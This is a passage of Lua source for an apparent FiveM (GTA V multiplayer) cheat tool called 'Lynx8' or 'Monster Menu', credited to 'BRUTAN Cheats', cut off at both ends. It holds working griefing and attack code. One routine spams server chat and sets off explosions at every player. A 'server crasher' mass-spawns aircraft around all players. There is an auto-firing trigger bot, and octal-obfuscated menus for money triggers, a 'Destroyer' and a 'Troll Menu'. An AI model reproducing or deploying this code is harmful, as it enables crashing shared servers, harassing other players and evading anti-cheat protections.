                            RequestModel(GetHashKey(cT))
                        end
                        while not HasModelLoaded(GetHashKey(cR)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(cR))
                        end
                        while not HasModelLoaded(GetHashKey(cU)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(cU))
                        end
                        while not HasModelLoaded(GetHashKey(cV)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(cV))
                        end
                        for by = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',
                                {141, 211, 255},
                                '^' ..
                                    by ..
                                        '\76\121\110\120\32\56\32\126\32\119\119\119\46\108\121\110\120\109\101\110\117\46\99\111\109'
                            )
                        end
                        for i = 0, 128 do
                            local cT =
                                CreateVehicle(GetHashKey(cR), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(cR), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(cR), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(cS), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(cS), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(cS), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(cT), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(cT), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(cT), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(cU), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(cU), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(cU), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(cV), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(cV), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(cV), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                        end
                    end
                )
            end
            if servercrasherxd then
                Citizen.CreateThread(
                    function()
                        local cR = 'Avenger'
                        local cS = 'CARGOPLANE'
                        local cT = 'luxor'
                        local cU = 'maverick'
                        local cV = 'blimp2'
                        while not HasModelLoaded(GetHashKey(cS)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(cS))
                        end
                        while not HasModelLoaded(GetHashKey(cT)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(cT))
                        end
                        while not HasModelLoaded(GetHashKey(cR)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(cR))
                        end
                        while not HasModelLoaded(GetHashKey(cU)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(cU))
                        end
                        while not HasModelLoaded(GetHashKey(cV)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(cV))
                        end
                        for i = 0, 128 do
                            for a = 100, 150 do
                                local cT =
                                    CreateVehicle(GetHashKey(cR), GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                                    CreateVehicle(GetHashKey(cR), GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                                    CreateVehicle(GetHashKey(cR), 2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
                                    CreateVehicle(GetHashKey(cS), GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                                    CreateVehicle(GetHashKey(cS), GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                                    CreateVehicle(GetHashKey(cS), 2 * GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                                    CreateVehicle(GetHashKey(cT), GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                                    CreateVehicle(GetHashKey(cT), 2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
                                    CreateVehicle(GetHashKey(cU), GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                                    CreateVehicle(GetHashKey(cU), GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                                    CreateVehicle(GetHashKey(cU), 2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
                                    CreateVehicle(GetHashKey(cV), GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                                    CreateVehicle(GetHashKey(cV), GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                                    CreateVehicle(GetHashKey(cV), 2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true)
                            end
                        end
                    end
                )
            end
            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                if IsControlPressed(0, 209) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                elseif IsControlPressed(0, 210) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                end
            end
            if TriggerBot then
                local cW, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity)
                if cW then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end
            DisplayRadar(true)
            if RainbowVeh then
                local a5 = d(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), a5.r, a5.g, a5.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), a5.r, a5.g, a5.b)
            end
            if t2x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
            end
            if t4x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
            end
            if t10x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
            end
            if t16x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
            end
            if txd then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
            end
            if Noclip then
                local nooclip = 199470348469665792
                local cX = 2
                local cY =
                    IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                    PlayerPedId(-1)
                FreezeEntityPosition(PlayerPedId(-1), true)
                SetEntityInvincible(PlayerPedId(-1), true)
                local cZ = GetEntityCoords(entity)
                DisableControlAction(0, 32, true)
                DisableControlAction(0, 268, true)
                DisableControlAction(0, 31, true)
                DisableControlAction(0, 269, true)
                DisableControlAction(0, 33, true)
                DisableControlAction(0, 266, true)
                DisableControlAction(0, 34, true)
                DisableControlAction(0, 30, true)
                DisableControlAction(0, 267, true)
                DisableControlAction(0, 35, true)
                DisableControlAction(0, 44, true)
                DisableControlAction(0, 20, true)
                local c_ = 0.0
                local d0 = 0.0
                if GetInputMode() == 'MouseAndKeyboard' then
                    if IsDisabledControlPressed(0, 32) then
                        c_ = 0.5
                    end
                    if IsDisabledControlPressed(0, 33) then
                        c_ = -0.5
                    end
                    if IsDisabledControlPressed(0, 34) then
                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
                    end
                    if IsDisabledControlPressed(0, 35) then
                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
                    end
                    if IsDisabledControlPressed(0, 44) then
                        d0 = 0.21
                    end
                    if IsDisabledControlPressed(0, 20) then
                        d0 = -0.21
                    end
                end
                cZ = GetOffsetFromEntityInWorldCoords(cY, 0.0, c_ * (cX + 0.3), d0 * (cX + 0.3))
                local d1 = GetEntityHeading(cY)
                SetEntityVelocity(cY, 0.0, 0.0, 0.0)
                SetEntityRotation(cY, 0.0, 0.0, 0.0, 0, false)
                SetEntityHeading(cY, d1)
                SetEntityCollision(cY, false, false)
                SetEntityCoordsNoOffset(cY, cZ.x, cZ.y, cZ.z, true, true, true)
                FreezeEntityPosition(cY, false)
                SetEntityInvincible(cY, false)
                SetEntityCollision(cY, true, true)
            end
        end
    end
)
Citizen.CreateThread(
    function()
        FreezeEntityPosition(entity, false)
        local d2 = 1
        local d3 = true
        local d4 = nil
        local d5 = nil
        local d6 = nil
        local d7 = 1
        local d8 = 1
        local d9 = {1.0, 2.0, 4.0, 10.0, 512.0, 9999.0}
        Lynx8.CreateMenu('\76\121\110\120\88', 'Monster Menu')
        Lynx8.SetSubTitle('\76\121\110\120\88', 'We love BRUTAN <3')
        Lynx8.CreateSubMenu('\83\101\108\102\77\101\110\117', '\76\121\110\120\88', '\83\101\108\102\32\77\101\110\117')
        Lynx8.CreateSubMenu(
            '\84\101\108\101\112\111\114\116\77\101\110\117',
            '\76\121\110\120\88',
            '\84\101\108\101\112\111\114\116\32\77\101\110\117'
        )
        Lynx8.CreateSubMenu(
            '\87\101\97\112\111\110\77\101\110\117',
            '\76\121\110\120\88',
            '\87\101\97\112\111\110\32\77\101\110\117'
        )
        Lynx8.CreateSubMenu(
            '\65\100\118\97\110\99\101\100\77\101\110\117',
            '\76\121\110\120\88',
            '\65\100\118\97\110\99\101\100\32\77\101\110\117'
        )
        Lynx8.CreateSubMenu('\76\117\97\77\101\110\117', '\76\121\110\120\88', '\76\117\97\32\77\101\110\117')
        Lynx8.CreateSubMenu(
            '\86\101\104\105\99\108\101\77\101\110\117',
            '\76\121\110\120\88',
            '\86\101\104\105\99\108\101\32\77\101\110\117'
        )
        Lynx8.CreateSubMenu("AICONTROLMENU", "VehicleMenu", "AI Menu")
        Lynx8.CreateSubMenu(
            '\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117',
            '\76\121\110\120\88',
            'Online Player Menu'
        )
        Lynx8.CreateSubMenu(
            '\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117',
            '\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117',
            'Player Options'
        )
        Lynx8.CreateSubMenu(
            '\68\101\115\116\114\111\121\101\114',
            '\65\100\118\97\110\99\101\100\77\101\110\117',
            '\68\101\115\116\114\111\121\101\114'
        )
        Lynx8.CreateSubMenu(
            '\69\83\88\66\111\115\115',
            '\76\117\97\77\101\110\117',
            '\69\83\88\32\66\111\115\115\32\84\114\105\103\103\101\114\115'
        )
        Lynx8.CreateSubMenu(
            '\69\83\88\77\111\110\101\121',
            '\76\117\97\77\101\110\117',
            '\69\83\88\32\77\111\110\101\121\32\84\114\105\103\103\101\114\115'
        )
        Lynx8.CreateSubMenu(
            '\69\83\88\68\114\117\103\115',
            '\76\117\97\77\101\110\117',
            '\69\83\88\32\68\114\117\103\115'
        )
        Lynx8.CreateSubMenu(
            '\69\83\88\67\117\115\116\111\109',
            '\76\117\97\77\101\110\117',
            '\69\83\88\32\82\97\110\100\111\109\32\84\114\105\103\103\101\114\115'
        )
        Lynx8.CreateSubMenu(
            '\86\82\80\84\114\105\103\103\101\114\115',
            '\76\117\97\77\101\110\117',
            '\86\82\80\32\84\114\105\103\103\101\114\115'
        )
        Lynx8.CreateSubMenu(
            '\77\105\115\99\84\114\105\103\103\101\114\115',
            '\76\117\97\77\101\110\117',
            '\77\105\115\99\32\84\114\105\103\103\101\114\115'
        )
        Lynx8.CreateSubMenu('\67\114\101\100\105\116\115', '\76\121\110\120\88', '\67\114\101\100\105\116\115')
        Lynx8.CreateSubMenu('\69\83\88\74\111\98\115', '\76\117\97\77\101\110\117', '\69\83\88\32\74\111\98\115')
        Lynx8.CreateSubMenu(
            '\69\83\88\74\111\98\115\50',
            '\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117',
            '\69\83\88\32\74\111\98\115\32\73\110\100\105\118\105\100\117\97\108'
        )
        Lynx8.CreateSubMenu(
            '\69\83\88\84\114\105\103\103\101\114\105\110\105',
            '\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117',
            '\69\83\88\32\84\114\105\103\103\101\114\115'
        )
        Lynx8.CreateSubMenu(
            '\84\114\111\108\108\109\101\110\117',
            '\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117',
            '\84\114\111\108\108\32\77\101\110\117'
        )
        Lynx8.CreateSubMenu(
            '\87\101\97\112\111\110\84\121\112\101\115',
            '\87\101\97\112\111\110\77\101\110\117',
            'Weapons'
        )
        Lynx8.CreateSubMenu(
            '\87\101\97\112\111\110\84\121\112\101\83\101\108\101\99\116\105\111\110',
            '\87\101\97\112\111\110\84\121\112\101\115',
            'Weapon'
        )
        Lynx8.CreateSubMenu(
            '\87\101\97\112\111\110\79\112\116\105\111\110\115',
            '\87\101\97\112\111\110\84\121\112\101\83\101\108\101\99\116\105\111\110',
            'Weapon Options'
        )
        Lynx8.CreateSubMenu('ModSelect', '\87\101\97\112\111\110\79\112\116\105\111\110\115', 'Weapon Mod Options')
        Lynx8.CreateSubMenu('CarTypes', '\86\101\104\105\99\108\101\77\101\110\117', 'Vehicles')
        Lynx8.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Moew :3')
        Lynx8.CreateSubMenu(
            '\67\97\114\79\112\116\105\111\110\115',
            'CarTypeSelection',
            '\67\97\114\32\79\112\116\105\111\110\115'
        )
        Lynx8.CreateSubMenu(
            '\71\105\118\101\83\105\110\103\108\101\87\101\97\112\111\110\80\108\97\121\101\114',
            '\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117',
            '\83\105\110\103\108\101\32\87\101\97\112\111\110\32\77\101\110\117'
        )
        Lynx8.CreateSubMenu(
            '\69\83\80\77\101\110\117',
            '\65\100\118\97\110\99\101\100\77\101\110\117',
            '\69\83\80\32\77\101\110\117'
        )
        Lynx8.CreateSubMenu('\76\83\67', '\86\101\104\105\99\108\101\77\101\110\117', 'LSC Customs')
        Lynx8.CreateSubMenu('tunings', '\76\83\67', 'Visual Tuning')
        Lynx8.CreateSubMenu('performance', '\76\83\67', 'Performance Tuning')
        Lynx8.CreateSubMenu(
            '\86\82\80\80\108\97\121\101\114\84\114\105\103\103\101\114\115',
            '\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117',
            '\86\82\80\32\84\114\105\103\103\101\114\115'
        )
        Lynx8.CreateSubMenu(
            '\66\111\111\115\116\77\101\110\117',
            '\86\101\104\105\99\108\101\77\101\110\117',
            '\86\101\104\105\99\108\101\32\66\111\111\115\116'
        )
        for i, da in pairs(be) do
            Lynx8.CreateSubMenu(da.id, 'tunings', da.name)
            if da.id == 'paint' then
                Lynx8.CreateSubMenu('primary', da.id, 'Primary Paint')
                Lynx8.CreateSubMenu('secondary', da.id, 'Secondary Paint')
                Lynx8.CreateSubMenu('rimpaint', da.id, 'Wheel Paint')
                Lynx8.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                Lynx8.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                Lynx8.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                Lynx8.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                Lynx8.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                Lynx8.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                Lynx8.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                Lynx8.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                Lynx8.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                Lynx8.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                Lynx8.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                Lynx8.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
        for i, da in pairs(bf) do
            Lynx8.CreateSubMenu(da.id, 'performance', da.name)
        end
        local SelectedPlayer
        while bm do
            ped = PlayerPedId()
            veh = GetVehiclePedIsUsing(ped)
            SetVehicleModKit(veh, 0)
            for i, da in pairs(be) do
                if Lynx8.IsMenuOpened('tunings') then
                    if b9 then
                        if bb == 'neon' then
                            local r, g, b = table.unpack(ba)
                            SetVehicleNeonLightsColour(veh, r, g, b)
                            SetVehicleNeonLightEnabled(veh, 0, bd)
                            SetVehicleNeonLightEnabled(veh, 1, bd)
                            SetVehicleNeonLightEnabled(veh, 2, bd)
                            SetVehicleNeonLightEnabled(veh, 3, bd)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif bb == 'paint' then
                            local db, dc, dd, de = table.unpack(ba)
                            SetVehicleColours(veh, db, dc)
                            SetVehicleExtraColours(veh, dd, de)
                            b9 = false
                            bb = -1
                            ba = -1
                        else
                            if bd == 'rm' then
                                RemoveVehicleMod(veh, bb)
                                b9 = false
                                bb = -1
                                ba = -1
                            else
                                SetVehicleMod(veh, bb, ba, false)
                                b9 = false
                                bb = -1
                                ba = -1
                            end
                        end
                    end
                end
                if Lynx8.IsMenuOpened(da.id) then
                    if da.id == 'wheeltypes' then
                        if Lynx8.Button('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif Lynx8.Button('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif Lynx8.Button('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif Lynx8.Button('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif Lynx8.Button('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif Lynx8.Button('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif Lynx8.Button('High End Wheels') then
                            SetVehicleWheelType(veh, 7)
                        end
                        Lynx8.Display()
                    elseif da.id == 'extra' then
                        local df = checkValidVehicleExtras()
                        for i, da in pairs(df) do
                            if IsVehicleExtraTurnedOn(veh, i) then
                                pricestring = '\73\110\115\116\97\108\108\101\100'
                            else
                                pricestring = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                            end
                            if Lynx8.Button(da.menuName, pricestring) then
                                SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i))
                            end
                        end
                        Lynx8.Display()
                    elseif da.id == 'neon' then
                        if Lynx8.Button('None') then
                            SetVehicleNeonLightsColour(veh, 255, 255, 255)
                            SetVehicleNeonLightEnabled(veh, 0, false)
                            SetVehicleNeonLightEnabled(veh, 1, false)
                            SetVehicleNeonLightEnabled(veh, 2, false)
                            SetVehicleNeonLightEnabled(veh, 3, false)
                        end
                        for i, da in pairs(bg) do
                            colorr, colorg, colorb = table.unpack(da)
                            r, g, b = GetVehicleNeonLightsColour(veh)
                            if
                                colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and
                                    not b9
                             then
                                pricestring = '\73\110\115\116\97\108\108\101\100'
                            else
                                if b9 and colorr == r and colorg == g and colorb == b then
                                    pricestring = '\80\114\101\118\105\101\119\105\110\103'
                                else
                                    pricestring = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                                end
                            end
                            if Lynx8.Button(i, pricestring) then
                                if not b9 then
                                    bb = 'neon'
                                    bd = IsVehicleNeonLightEnabled(veh, 1)
                                    oldr, oldg, oldb = GetVehicleNeonLightsColour(veh)
                                    ba = table.pack(oldr, oldg, oldb)
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    b9 = true
                                elseif b9 and colorr == r and colorg == g and colorb == b then
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    b9 = false
                                    bb = -1
                                    ba = -1
                                elseif b9 and colorr ~= r or colorg ~= g or colorb ~= b then
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    b9 = true
                                end
                            end
                        end
                        Lynx8.Display()
                    elseif da.id == 'paint' then
                        if Lynx8.MenuButton('~h~~p~-> ~s~Primary Paint', 'primary') then
                        elseif Lynx8.MenuButton('~h~~p~-> ~s~Secondary Paint', 'secondary') then
                        elseif Lynx8.MenuButton('~h~~p~-> ~s~Wheel Paint', 'rimpaint') then
                        end
                        Lynx8.Display()
                    else
                        local at = checkValidVehicleMods(da.id)
                        for dg, dh in pairs(at) do
                            if dh.menuName == '~h~~b~Stock' then
                                price = 0
                            end
                            if da.name == 'Horns' then
                                for di, dj in pairs(horns) do
                                    if dj == dg - 1 then
                                        dh.menuName = di
                                    end
                                end
                            end
                            if dh.menuName == 'NULL' then
                                dh.menuname = 'unknown'
                            end
                            if Lynx8.Button(dh.menuName, price) then
                                if not b9 then
                                    bb = da.id
                                    ba = GetVehicleMod(veh, da.id)
                                    b9 = true
                                    if dh.data.realIndex == -1 then
                                        bd = 'rm'
                                        RemoveVehicleMod(veh, dh.data.modid)
                                        b9 = false
                                        bb = -1
                                        ba = -1
                                        bd = false
                                    else
                                        bd = false
                                        SetVehicleMod(veh, da.id, dh.data.realIndex, false)
                                    end
                                elseif b9 and GetVehicleMod(veh, da.id) == dh.data.realIndex then
                                    b9 = false
                                    bb = -1
                                    ba = -1
                                    bd = false
                                    if dh.data.realIndex == -1 then
                                        RemoveVehicleMod(veh, dh.data.modid)
                                    else
                                        SetVehicleMod(veh, da.id, dh.data.realIndex, false)
                                    end
                                elseif b9 and GetVehicleMod(veh, da.id) ~= dh.data.realIndex then
                                    if dh.data.realIndex == -1 then
                                        RemoveVehicleMod(veh, dh.data.modid)
                                        b9 = false
                                        bb = -1
                                        ba = -1
                                        bd = false
                                    else
                                        SetVehicleMod(veh, da.id, dh.data.realIndex, false)
                                        b9 = true
                                    end
                                end
                            end
                        end
                        Lynx8.Display()
                    end
                end
            end
            for i, da in pairs(bf) do
                if Lynx8.IsMenuOpened(da.id) then
                    if GetVehicleMod(veh, da.id) == 0 then
                        pricestock = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price1 = '\73\110\115\116\97\108\108\101\100'
                        price2 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price3 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price4 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                    elseif GetVehicleMod(veh, da.id) == 1 then
                        pricestock = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price1 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price2 = '\73\110\115\116\97\108\108\101\100'
                        price3 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price4 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                    elseif GetVehicleMod(veh, da.id) == 2 then
                        pricestock = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price1 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price2 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price3 = '\73\110\115\116\97\108\108\101\100'
                        price4 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                    elseif GetVehicleMod(veh, da.id) == 3 then
                        pricestock = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price1 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price2 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price3 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price4 = '\73\110\115\116\97\108\108\101\100'
                    elseif GetVehicleMod(veh, da.id) == -1 then
                        pricestock = '\73\110\115\116\97\108\108\101\100'
                        price1 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price2 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price3 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                        price4 = '\78\111\116\32\73\110\115\116\97\108\108\101\100'
                    end
                    if Lynx8.Button('Stock ' .. da.name, pricestock) then
                        SetVehicleMod(veh, da.id, -1)
                    elseif Lynx8.Button(da.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, da.id, 0)
                    elseif Lynx8.Button(da.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, da.id, 1)
                    elseif Lynx8.Button(da.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, da.id, 2)
                    elseif da.id ~= 13 and da.id ~= 12 and Lynx8.Button(da.name .. ' Upgrade 4', price4) then
                        SetVehicleMod(veh, da.id, 3)
                    end
                    Lynx8.Display()
                end
            end
            if Lynx8.IsMenuOpened('\76\121\110\120\88') then
                local dk = PlayerId(-1)
                local bv = GetPlayerName(dk)
                drawNotification("~h~Monster <FONT COLOR='#FF2323'>Menu")
                drawNotification("<FONT COLOR='#22ff40'>Modified By BRUTAN Cheats")
                if
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\83\101\108\102\32\77\101\110\117',
                        '\83\101\108\102\77\101\110\117'
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\79\110\108\105\110\101\32\80\108\97\121\101\114\115',
                        '\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117'
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\84\101\108\101\112\111\114\116\32\77\101\110\117',
                        '\84\101\108\101\112\111\114\116\77\101\110\117'
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\86\101\104\105\99\108\101\32\77\101\110\117',
                        '\86\101\104\105\99\108\101\77\101\110\117'
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\87\101\97\112\111\110\32\77\101\110\117',
                        '\87\101\97\112\111\110\77\101\110\117'
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\76\117\97\32\77\101\110\117\32\60\70\79\78\84\32\67\79\76\79\82\61\39\35\102\102\50\50\102\52\39\62\126\104\126\58\51',
                        '\76\117\97\77\101\110\117'
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\65\100\118\97\110\99\101\100\32\77\111\100\101\32\60\70\79\78\84\32\67\79\76\79\82\61\39\35\102\102\50\50\102\52\39\62\126\104\126\62\58\51',
                        '\65\100\118\97\110\99\101\100\77\101\110\117'
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\67\114\101\100\105\116\115\32\60\70\79\78\84\32\67\79\76\79\82\61\39\35\102\102\50\50\102\52\39\62\126\104\126\58\68',
                        '\67\114\101\100\105\116\115'
                    )
                 then
                elseif Lynx8.Button('\126\114\126\126\104\126\80\97\110\105\99\32\75\101\121') then
                    drawNotification('\126\114\126\126\104\126\66\121\101\32\66\121\101\46')
                    logged = true
                    bm = false
                elseif Lynx8.Button('\126\114\126\126\104\126\76\111\103\111\117\116') then
                    drawNotification('\126\114\126\126\104\126\66\121\101\32\66\121\101\46')
                    logged = true
                    Lynx8.CloseMenu()
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\83\101\108\102\77\101\110\117') then
                if
                    Lynx8.CheckBox(
                        '\126\104\126\126\103\126\71\111\100\109\111\100\101',
                        Godmode,
                        function(dl)
                            Godmode = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\103\126\80\108\97\121\101\114\32\86\105\115\105\98\108\101',
                        cz,
                        function(dl)
                            cz = dl
                        end
                    )
                 then
                elseif Lynx8.Button('\126\104\126\126\114\126\83\117\105\99\105\100\101') then
                    SetEntityHealth(PlayerPedId(-1), 0)
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\103\126\69\83\88\126\115\126\32\82\101\118\105\118\101\32\89\111\117\114\115\101\108\102\126\115\126'
                    )
                 then
                    TriggerEvent(
                        '\101\115\120\95\97\109\98\117\108\97\110\99\101\106\111\98\58\114\101\118\105\118\101'
                    )
                elseif Lynx8.Button('\126\104\126\126\103\126\72\101\97\108\47\82\101\118\105\118\101') then
                    SetEntityHealth(PlayerPedId(-1), 200)
                elseif Lynx8.Button('\126\104\126\126\98\126\71\105\118\101\32\65\114\109\111\117\114') then
                    SetPedArmour(PlayerPedId(-1), 200)
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\73\110\102\105\110\105\116\101\32\83\116\97\109\105\110\97',
                        InfStamina,
                        function(dl)
                            InfStamina = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\84\104\101\114\109\97\108\32\126\111\126\86\105\115\105\111\110',
                        bTherm,
                        function(bTherm)
                        end
                    )
                 then
                    therm = not therm
                    bTherm = therm
                    SetSeethrough(therm)
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\70\97\115\116\32\82\117\110',
                        fastrun,
                        function(dl)
                            fastrun = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
